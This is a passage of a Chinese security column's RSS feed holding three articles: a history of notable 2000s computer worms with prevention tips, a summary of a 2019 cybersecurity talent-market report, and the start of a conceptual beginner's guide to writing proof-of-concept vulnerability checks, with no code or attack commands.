data-rawheight=&quot;400&quot; class=&quot;content_image&quot; width=&quot;318&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9e184cc578698db8ea57c33fd7624177_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;318&quot; data-rawheight=&quot;400&quot; class=&quot;content_image lazy&quot; width=&quot;318&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-9e184cc578698db8ea57c33fd7624177_b.jpg&quot;/&gt;&lt;figcaption&gt;制造冲击波变种的少年&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;冲击波病毒是利用在2003年7月21日公布的RPC漏洞进行传播的，该病毒于当年8月爆发。病毒运行时会不停地利用IP扫描技术寻找网络上系统为Win2000或XP的计算机，找到后就利用DCOM/RPC缓冲区漏洞攻击该系统，一旦攻击成功，病毒体将会被传送到对方计算机中进行感染，使系统操作异常、不停重启、甚至导致系统奔溃。另外，该病毒还会对系统升级网站进行拒绝服务攻击，导致该网站堵塞，使用户无法通过该网站升级系统。只要是计算机上有RPC服务并且没有打安全补丁的计算机都存在有RPC漏洞，具体涉及的操作系统是：Windows 2000\XP\Server 2003\NT4.0。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f7b3a809aba649d84221aa59700bf4ca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;325&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-f7b3a809aba649d84221aa59700bf4ca_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f7b3a809aba649d84221aa59700bf4ca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;325&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-f7b3a809aba649d84221aa59700bf4ca_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f7b3a809aba649d84221aa59700bf4ca_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;对于依赖计算机运行的商业领域而言，2003年夏天是一个艰难的时期。一波未平，一波又起。“冲击波”一走，“霸王虫”病毒便接踵而至。它是8月19日开始迅速传播，在最初的24小时之内，自身复制了100万次，创下了历史纪录(后来被Mydoom病毒打破)。病毒伪装在文件名看似无害的邮件附件之中。被激活之后，这个蠕虫便向用户的本地文件类型中发现的电子邮件地址传播自身。最终结果是造成互联网流量激增。&lt;/p&gt;&lt;p&gt;2003年9月10日，病毒禁用了自身，从此不再成为威胁。为得到线索，找出Sobig.F病毒的始作俑者，微软宣布悬赏25万美元，但至今为止，这个作恶者也没有被抓到。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-59c3b7bee3a909297a64b4830ba843d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;580&quot; data-rawheight=&quot;435&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;580&quot; data-original=&quot;https://pic3.zhimg.com/v2-59c3b7bee3a909297a64b4830ba843d2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-59c3b7bee3a909297a64b4830ba843d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;580&quot; data-rawheight=&quot;435&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;580&quot; data-original=&quot;https://pic3.zhimg.com/v2-59c3b7bee3a909297a64b4830ba843d2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-59c3b7bee3a909297a64b4830ba843d2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;“冲击波”余音未消，“震荡波”又来了，时隔一年之后又一款和冲击波表现类似的电脑病毒重回网友电脑。从名称上看，这两款病毒貌似区别并不是很大，甚至连重启提示都长得一样一样的。但实际上冲击波利用的是系统RPC漏洞，而震荡波利用的则是系统LSASS漏洞。甭管怎么说吧，反正这两种病毒始终都是那个时代的噩梦！&lt;/p&gt;&lt;h2&gt;7. &lt;b&gt;熊猫烧香&lt;/b&gt;&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0768b0d6362f1139ab9e2b88bfed94a7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;500&quot; data-original=&quot;https://pic4.zhimg.com/v2-0768b0d6362f1139ab9e2b88bfed94a7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0768b0d6362f1139ab9e2b88bfed94a7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;500&quot; data-original=&quot;https://pic4.zhimg.com/v2-0768b0d6362f1139ab9e2b88bfed94a7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0768b0d6362f1139ab9e2b88bfed94a7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;又是一款国产病毒……&lt;/p&gt;&lt;p&gt;2006年底到2007年初短短两个月时间里，一款名叫“熊猫烧香”的病毒便席卷了整个神州大地，一时间各大网站、个人电脑都被一个很诡异的病毒图标所覆盖——一只正在烧香的熊猫。&lt;/p&gt;&lt;p&gt;它主要通过下载的档案传染，受到感染的机器文件因为被误携带间接对其它 计算机程序、系统破坏严重。在短短的两个多月时间，该病毒不断入侵个人电脑，给上百万个人用户、网吧及企业局域网用户带来无法估量的损失，被《2006年度中国大陆地区电脑病毒疫情和互联网安全报告》评为“毒王”。而它的始作俑者——湖北武汉新洲区人李俊，也在当年被判处4年有期徒刑！&lt;/p&gt;&lt;p&gt;可以预见，越来越多的病毒木马程序会出现，技术和传播途径上也会非常类似与现在的勒索病毒，因此我们只要做到以下注意事项，就可以很好地预防计算机中毒：&lt;/p&gt;&lt;p&gt;1 收到陌生可疑邮件，请谨慎处理不要贸然点开，尤其是包含链接和附件的那种。&lt;/p&gt;&lt;p&gt;2 使用独立移动硬盘备份所有计算机里面的重要数据和资料，尽量避免移动硬盘接入网络。&lt;/p&gt;&lt;p&gt;3 及时修复系统漏洞，至少安装一款杀毒软件和一款数据恢复软件&lt;/p&gt;&lt;p&gt;4 最好还是尽快地升级到Windows 10最新版本&lt;/p&gt;&lt;p&gt;5 只到正规下载站去安装软件，不随便搜索下载安装软件！&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-13-77958872</guid>
<pubDate>Tue, 13 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>2019 网络安全人才市场状况研究报告</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-12-77766888.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/77766888&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cf581b7bf2e2b5ab4b89533f5940ef9b_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;近日，智联招聘发布了《2019网络安全人才市场状况研究报告》（以下简称《报告》）。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;近一年来，网络安全人才需求规模呈现大幅增长态势&lt;/b&gt;。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;根据智联招聘网络安全人才大数据显示，2019年6月网络安全人才市场需求的规模达到2016年1月需求的24.6倍，相比2018年7月也增长了3倍，增长速度堪称惊人！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2dc258f1ad0164eb9699ef3bb386cbc5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-2dc258f1ad0164eb9699ef3bb386cbc5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2dc258f1ad0164eb9699ef3bb386cbc5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-2dc258f1ad0164eb9699ef3bb386cbc5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-2dc258f1ad0164eb9699ef3bb386cbc5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;伴随规模的增长，网安人才需求的地域集中度持续下降&lt;/b&gt;。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;2019年网安人才需求最多的5个城市占全国总需求的比例从60.7%下降到48.8%，降低了16.5个百分点，网络安全人才需求不再集中于少数的几个大城市。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fa944bf6388bc04f3c16979a31147272_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic3.zhimg.com/v2-fa944bf6388bc04f3c16979a31147272_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fa944bf6388bc04f3c16979a31147272_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic3.zhimg.com/v2-fa944bf6388bc04f3c16979a31147272_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-fa944bf6388bc04f3c16979a31147272_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;非重点高校输出网安人才的增长速度高于重点高校&lt;/b&gt;。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;上一年度的统计中，输出网安人才最多的10所高校几乎都是重点大学，今年仅有3所重点大学。很多非重点的高校出现，说明更多普通型、应用型高校成为网安人才的输出重地。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-42c4900ea058aa65fc475bb7b3f2d589_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-42c4900ea058aa65fc475bb7b3f2d589_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-42c4900ea058aa65fc475bb7b3f2d589_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-42c4900ea058aa65fc475bb7b3f2d589_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-42c4900ea058aa65fc475bb7b3f2d589_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;需要说明的是，上述的结构性对比，只能说明网络安全人才在学历结构供需的相对情况，而目前国内网络安全人才市场在数量上呈现出整体的短缺状态，对各种学历的人群都适用。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;网络安全人才的薪资和福利&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;2019年求职者期望的平均薪资为11263.9元/月。而政企机构提供的网络安全相关岗位的平均薪酬约为11728.9元/月。安全企业提供给网络安全相关岗位的平均薪酬约为12004.8元/月。&lt;/p&gt;&lt;p&gt;从具体分布上来看，2.0%的求职者期望的薪资水平在5000元/月以下，59.5%的求职者期望薪资水平在5000元/月-10000元/月，渴望薪资水平在10000元/月-30000元/月的占36%。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7796ec4b145d28b6ae40a00c13a3744d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-7796ec4b145d28b6ae40a00c13a3744d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7796ec4b145d28b6ae40a00c13a3744d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic2.zhimg.com/v2-7796ec4b145d28b6ae40a00c13a3744d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-7796ec4b145d28b6ae40a00c13a3744d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;安全运营与服务类的岗位需求大幅增长。&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;安全运营与服务类的岗位需求大幅增长，成为政企机构招聘最多的岗位类型，占比高达32.7%，&lt;b&gt;首次超过研发测试岗位&lt;/b&gt;。随着，政企机构安全建设水平的提升，安全运营与服务越来越受到用人单位的重视，未来的市场需求很有可能持续扩大。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4efc175e900bad0c34c706cb2cfe5ee3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic4.zhimg.com/v2-4efc175e900bad0c34c706cb2cfe5ee3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4efc175e900bad0c34c706cb2cfe5ee3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic4.zhimg.com/v2-4efc175e900bad0c34c706cb2cfe5ee3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-4efc175e900bad0c34c706cb2cfe5ee3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;用人单位对工作经验的要求&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;统计显示，政企机构用人单位在网络安全人才的招聘过程中，有48.3%的岗位要求工作经验1-3年，其次为要求工作经验3-5年，占34.7%。也有11.2%的岗位招聘对工作经验要求5-10年，而无经验的招聘需求较少，仅占1.6%。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d978ae4837021301c85e9ea3b6d5a34b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic4.zhimg.com/v2-d978ae4837021301c85e9ea3b6d5a34b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d978ae4837021301c85e9ea3b6d5a34b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic4.zhimg.com/v2-d978ae4837021301c85e9ea3b6d5a34b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d978ae4837021301c85e9ea3b6d5a34b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;这在一定程度上说明，大多数政企机构用人单位，由于没有足够的精力和资源专门培养属于自己的安全人员，因此会更加偏向于直接选择经验丰富的安全人员。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;男性是网络安全人才构成的绝对主体。&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;通过对应聘网络安全岗位的求职者简历分析，我们发现，男性是网络安全人才构成的绝对主体，占比高达82.1%，而女性占比仅为17.9%。由此可见，网络安全领域，基本上还是以男性为主。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c6ccd0a1e344dc5798e10bf36522bcf2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1344&quot; data-original=&quot;https://pic3.zhimg.com/v2-c6ccd0a1e344dc5798e10bf36522bcf2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c6ccd0a1e344dc5798e10bf36522bcf2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1344&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1344&quot; data-original=&quot;https://pic3.zhimg.com/v2-c6ccd0a1e344dc5798e10bf36522bcf2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-c6ccd0a1e344dc5798e10bf36522bcf2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;* （本报告以智联招聘多年来形成的丰富的招聘、求职信息大数据为基础，结合了奇安信集团在网络安全领域多年来的专业研究经验，相关研究成果具有很强的代表性。希望此份研究报告能够对用人单位以及网络安全岗位的求职者们提供有价值的参考信息。）&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-12-77766888</guid>
<pubDate>Mon, 12 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>PoC 编写指南</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-09-77353899.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/77353899&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6e2665ec85559235958060b4fa69bc7d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;什么是 PoC&lt;/h2&gt;&lt;p&gt;PoC（全称: Proof of Concept）, 中文译作概念验证。在安全界，你可以理解成为&lt;b&gt;漏洞验证程序&lt;/b&gt;。和一些应用程序相比，PoC 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。因为是一些代码片段，所以到现在都没看到有一本书来讲怎么编写 PoC 的，因为这些东西对于会写代码的人来说，他们会很惊讶分分钟就会了的事为什么还要出本书。&lt;/p&gt;&lt;h2&gt;什么是 Exp&lt;/h2&gt;&lt;p&gt;Exp（全称: Exploit）,中文叫&lt;b&gt;漏洞利用程序，&lt;/b&gt;就是一段可以发挥漏洞价值的程序。想象一下这样的场景，目标存在一个 SQL 注入漏洞，然后被你知道了，然后你编写了一个程序，通过这个 SQL 注入漏洞，拿到了目标的权限，那么这个程序就是所谓的 Exp 了，当然，如果你没有使用这个漏洞，它就这么放着，那么这个漏洞，对你来说可以认为是没有价值的。&lt;/p&gt;&lt;h2&gt;关于 PoC/Exp 的两个误区&lt;/h2&gt;&lt;p&gt;&lt;b&gt;1. 写 PoC 要会 Python？&lt;/b&gt;&lt;br/&gt;PoC 的存在，只有一个目的：证明漏洞存在。而关于 PoC 的形式，或者说代码实现方式，你喜欢用什么方式，就用什么方式。我们推荐 Python, 只是说安全界用 Python 的人居多，你写的东西能被更多人看懂，还有 Python 这门语言的灵活，类库强大等特性，给编写的人提供了很大便利。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. PoC 就是 Exp?&lt;/b&gt;&lt;br/&gt;其实严格来讲，PoC 和 Exp 是两个东西。PoC 就是用来证明漏洞存在的，而 Exp 是用来利用这个漏洞的，在很多情况下，我们知道了漏洞存在，却不知道具体怎么利用，编写一个 PoC 非常简单，而编写一个 Exp 是相当有挑战性的。&lt;/p&gt;&lt;blockquote&gt;PoC 和 Exp 的区别就有点像你发现了家门口的超市的锁有问题，你给人家证明锁有问题和通过锁有问题这个现象偷到超市的钱，这是两码事。&lt;/blockquote&gt;&lt;h2&gt;什么是漏洞靶场&lt;/h2&gt;&lt;p&gt;漏洞靶场（Vulnerability Firing Range）, 就是跑着有漏洞的程序的测试机器。一般用虚拟机来实现，当然现在也有用 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//hub.docker.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Docker&lt;/a&gt; 来实现的，反正就是给你一个已经复现了漏洞的环境让你测试漏洞的东西。&lt;/p&gt;&lt;p&gt;我们在学习 PoC 编写的时候，推荐自己搭建靶场来测试，不推荐直接使用互联网上跑着业务的机器，因为现实环境安全配置情况往往要比靶场复杂的多，不利于新手学习，这些都不是重点，重点是万一你不小心把人家机器搞坏了，你说这锅谁来背？&lt;/p&gt;&lt;h2&gt;PoC 编写流程&lt;/h2&gt;&lt;p&gt;这里我们不讨论未公开的漏洞，对于一个已经公开的漏洞，PoC 的编写流程是这样的:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;根据漏洞详情，寻找受影响版本程序。&lt;br/&gt;如果是一些 CMS, 可以去 对应的官网下载历史版本程序,有些漏洞作者不会提具体版本号，那你就要根据漏洞作者提交的时间来判断了。当然除了官方网站之外，还可以去 github 上寻找源码，这些个官网都喜欢把历史版本的程序删除掉，善用 github 上的 tag, branch, release 功能，上面有你要的所有版本。&lt;/li&gt;&lt;li&gt;搭建对应漏洞靶场&lt;br/&gt;这里其实没什么好说的，下载了人家的源码之后，在你的虚拟机里面配置好环境就行了，还能顺便学一下运维的一些皮毛知识。&lt;/li&gt;&lt;li&gt;手动复现漏洞&lt;br/&gt;根据漏洞详情，手动将整个流程走一遍，熟悉下复现条件，比如使用 GET 还是 POST 请求，需不需要登陆，返回的页面会是什么样子的，我提交不同的参数，会不会出现其它结果，如果漏洞不存在的话，会出现什么样的结果......&lt;br/&gt;磨刀不误砍柴功，熟悉了这些之后，后面编码实现简直就是分分钟的事，因为一开始我们就说过了，PoC 就是一小段代码。&lt;/li&gt;&lt;li&gt;写代码&lt;br/&gt;手动复现了一次漏洞之后，分析漏洞证明步骤，根据自己的实际测试情况一步一步写代码，用我的话来说，写代码，其实就是用程序模拟人工操作的每一个步骤，如果你上一步认真做了，这一步只是经验问题，本教程将在后面丰富你在这方面的阅历。&lt;/li&gt;&lt;li&gt;测试 PoC&lt;br/&gt;其它测试和编码基本都是在同时进行的，为什么要单独提出来讲呢，我们在写 PoC 的时候，除了在存在漏洞的靶机上测试我们的代码，还要在不存在漏洞的站点测试，一般为说，一个优秀的 PoC 在后期测试的时候要求对 10000 个目标测试，误报不能超过 10 个。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;PoC 与 PoC 框架&lt;/h2&gt;&lt;p&gt;PoC 框架就是一个批量管理，调度 PoC 的程序。因为是框架，要批量调度，那就要求 PoC 在编写的时候要遵守一些规范，这些规范常见的有:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;入口规范&lt;br/&gt;考虑到批量使用 PoC 的调度情况，统一入口框架调用该 PoC 的时候会非常之方便。这个就需要根据具体的框架的调度要求来看了，都有文档的，看一下就会了。&lt;/li&gt;&lt;li&gt;API 规范&lt;br/&gt;API 是该框架对一些基础类库的封装，比如说框架提供了一些网络请求工具。这些封装有什么好处呢？我还是举例子来说明，比如某次扫描，调用了 1000 个 PoC 去扫描目标主机了，假设这个扫描任务中有一部分是需要登录的，而有一些的作者在编写的时候忘记在 PoC 中接收用户自定义的 Cookie 了，那么此时就会因为接收不到 Cookie 而导致请求不成功。那么在使用了框架的情况下，即使在忘记了添加这些字段的情况下，框架也会自动将 Cookie 添加进请求中，为 PoC 开发者提供了极大的便利。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;国内 PoC 框架简介&lt;/h2&gt;&lt;p&gt;官方的可以去各自的平台看，这里只简要说一下。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//www.beebeeto.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Beebeeto&lt;/a&gt;&lt;br/&gt;Evi1m0 创办，民间社区。PoC 开发语言为 Python。白帽子互相学习并使用它人的 PoC。2016 年被 Sebug 收购。&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//docs.beebeeto.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Beebeeto 开发文档地址&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.sebug.net/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Sebug-Pocsuite&lt;/a&gt;&lt;br/&gt;早年学安全的人都听过 Sebug 的名号，以前的民间漏洞库，后来被知道创宇收购。Pocsuite 是 Sebug 平台上通用的远程漏洞验证框架，使用 Python 编写 PoC。写 PoC 可以直接兑换实物与现金奖励，兑换比例 1KB = ￥5（这是 RMB 不是日元）。Sebug 收购 Beebeeto 后，更名为 Seebug。&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/knownsec/Pocsuite&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Pocsuite 开发文档地址&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//bugscan.net/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Bugscan&lt;/a&gt;&lt;br/&gt;西安四叶草安全驱动的国内首个基于社区的分布式漏洞扫描平台。PoC 在这里也被称作插件。使用 Python 编写 PoC, 要求只能使用 Python2.7 的标准库。写插件有 rank 奖励，可兑换实物奖励，兑换比例 1 Rank = ￥10，商城有个比亚迪秦，看着很诱人啊。&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.bugscan.net/%23%21/i/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Bugscan 开发文档地址&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//www.tangscan.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Tangscan&lt;/a&gt;&lt;br/&gt;Wooyun 社区驱动的针对企业的扫描器，使用 Python 编写 PoC。写 PoC 命中后有汤圆，可参与分红。&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//tangscan.readthedocs.org/zh_CN/latest/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Tangscan 